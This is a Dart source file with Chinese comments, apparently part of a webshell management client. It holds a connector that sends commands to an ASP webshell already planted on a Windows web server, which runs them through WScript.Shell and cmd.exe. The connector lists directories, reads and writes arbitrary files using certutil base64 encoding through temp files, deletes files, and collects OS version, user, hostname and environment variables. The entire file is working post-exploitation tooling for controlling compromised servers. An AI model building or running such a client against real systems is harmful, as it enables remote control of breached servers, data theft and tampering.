import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// `asp_wscript_get.asp`：`WScript.Shell.Exec("cmd.exe /c " & cmd)`
///
/// Windows 命令执行型。
/// 特殊之处：ASP 使用 Server.HTMLEncode 对输出 HTML 编码，需要解码。
class AspWscriptConnector extends ShellExecConnector {
  AspWscriptConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'cmd';

  @override
  Future<String> sendRawCommand(String cmd) async {
    try {
      final uri = Uri.parse(webshell.url);
      http.Response response;

      if (webshell.method == 'POST') {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {_param: cmd},
            )
            .timeout(const Duration(seconds: 30));
      } else {
        // ASP 默认 GET
        final params = Map<String, String>.from(uri.queryParameters);
        params[_param] = cmd;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 30));
      }

      if (response.statusCode != 200) return '[HTTP ${response.statusCode}]';
      return _decode(decodeWithFallback(response.bodyBytes));
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 去除 `<pre>...</pre>` 包装并 HTML 解码
  static String _decode(String raw) {
    var s = raw.trim();
    if (s.startsWith('<pre>')) s = s.substring(5);
    if (s.endsWith('</pre>')) s = s.substring(0, s.length - 6);
    return _htmlDecode(s.trim());
  }

  static String _htmlDecode(String s) => s
      .replaceAll('&lt;', '<')
      .replaceAll('&gt;', '>')
      .replaceAll('&amp;', '&')
      .replaceAll('&quot;', '"')
      .replaceAll('&#39;', "'")
      .replaceAll('&nbsp;', ' ');

  // ── Windows 专用覆盖 ──────────────────────────────────────────────────────

  @override
  Future<String> getCurrentDir() async {
    final r = (await sendRawCommand('cd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final raw = await sendRawCommand('dir "$path" /a 2>&1');
    return _parseDirOutput(raw);
  }

  static List<FileEntry> _parseDirOutput(String raw) {
    final entries = <FileEntry>[];
    for (final line in raw.split('\n')) {
      final l = line.trim();
      final match = RegExp(
              r'(\d{2}/\d{2}/\d{4})\s+(\d{2}:\d{2}\s+[AP]M)\s+(<DIR>|\S+)\s+(.+)')
          .firstMatch(l);
      if (match == null) continue;
      final dateStr = '${match.group(1)} ${match.group(2)}';
      final sizeOrDir = match.group(3)!;
      final name = match.group(4)!.trim();
      if (name == '.') continue;
      final isDir = sizeOrDir == '<DIR>';
      final size =
          isDir ? 0 : int.tryParse(sizeOrDir.replaceAll(',', '')) ?? 0;
      entries.add(FileEntry(
        name: name,
        isDirectory: isDir,
        size: size,
        permissions: '',
        modified: dateStr,
      ));
    }
    entries.sort((a, b) {
      if (a.name == '..') return -1;
      if (b.name == '..') return 1;
      if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.toLowerCase().compareTo(b.name.toLowerCase());
    });
    return entries;
  }

  @override
  Future<String> readFile(String path) async {
    // Windows 通过 certutil 做 base64 传输
    final raw = await sendRawCommand(
        'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && type "%TEMP%\\__mx_enc.tmp" && del "%TEMP%\\__mx_enc.tmp"');
    if (raw.isEmpty || raw.startsWith('[')) return '[文件不存在或无权读取]';
    // certutil 输出：BEGIN CERTIFICATE header + base64 + END CERTIFICATE
    final lines = raw.split('\n').map((l) => l.trim()).toList();
    final b64 = lines
        .where((l) =>
            l.isNotEmpty &&
            !l.startsWith('-----') &&
            !l.startsWith('CertUtil'))
        .join('');
    try {
      return decodeWithFallback(base64.decode(b64));
    } catch (_) {
      return '[读取失败：编码错误]';
    }
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final b64 = base64.encode(utf8.encode(content));
    // 写临时 base64 文件再 certutil 解码
    final r = await sendRawCommand(
        'echo $b64 > "%TEMP%\\__mx_dec.tmp" && certutil -decode "%TEMP%\\__mx_dec.tmp" "$path" && del "%TEMP%\\__mx_dec.tmp" && echo 1');
    return r.trim().contains('1');
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final raw = await sendRawCommand(
        'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && type "%TEMP%\\__mx_enc.tmp" && del "%TEMP%\\__mx_enc.tmp"');
    if (raw.isEmpty || raw.startsWith('[')) throw Exception('无法读取文件: $raw');
    final b64 = raw.split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty && !l.startsWith('-----') && !l.startsWith('CertUtil'))
        .join('');
    return base64.decode(b64);
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    final b64 = base64.encode(bytes);
    final r = await sendRawCommand(
        'echo $b64 > "%TEMP%\\__mx_dec.tmp" && certutil -decode "%TEMP%\\__mx_dec.tmp" "$path" && del "%TEMP%\\__mx_dec.tmp" && echo 1');
    return r.trim().contains('1');
  }

  @override
  Future<bool> deleteFile(String path) async {
    final r = await sendRawCommand('del /f "$path" && echo 1');
    return r.trim().contains('1');
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    const sep = '###MATRIX_SEP###';
    final cmd = [
      'echo ${sep}OS${sep}',   'ver',
      'echo ${sep}USER${sep}', 'echo %USERNAME%',
      'echo ${sep}PWD${sep}',  'cd',
      'echo ${sep}HOST${sep}', 'hostname',
    ].join(' & ');
    const keyMap = {
      'OS': 'OS', 'USER': '运行用户', 'PWD': '当前目录', 'HOST': '主机名',
    };
    return ShellExecConnector.parseSepOutput(
        await sendRawCommand(cmd), sep, keyMap);
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
      String path) async {
    final allRaw = await sendRawCommand('dir /b "$path" 2>nul');
    final dirRaw = await sendRawCommand('dir /b /ad "$path" 2>nul');
    if (allRaw.isEmpty || allRaw.startsWith('[')) return [];
    final dirs =
        dirRaw.split('\n').map((l) => l.trim().toLowerCase()).toSet();
    final result = <({String name, bool isDir})>[];
    for (final line in allRaw.split('\n')) {
      final name = line.trim();
      if (name.isEmpty) continue;
      result.add((name: name, isDir: dirs.contains(name.toLowerCase())));
    }
    result.sort((a, b) => a.name.compareTo(b.name));
    return result;
  }

  @override
  Future<String> getHomeDir() async =>
      (await sendRawCommand('echo %USERPROFILE%')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final raw = await sendRawCommand('set');
    if (raw.isEmpty || raw.startsWith('[')) return [];
    return raw
        .split('\n')
        .map((l) => l.split('=').first.trim())
        .where((s) => s.isNotEmpty)
        .toList()
      ..sort();
  }
}
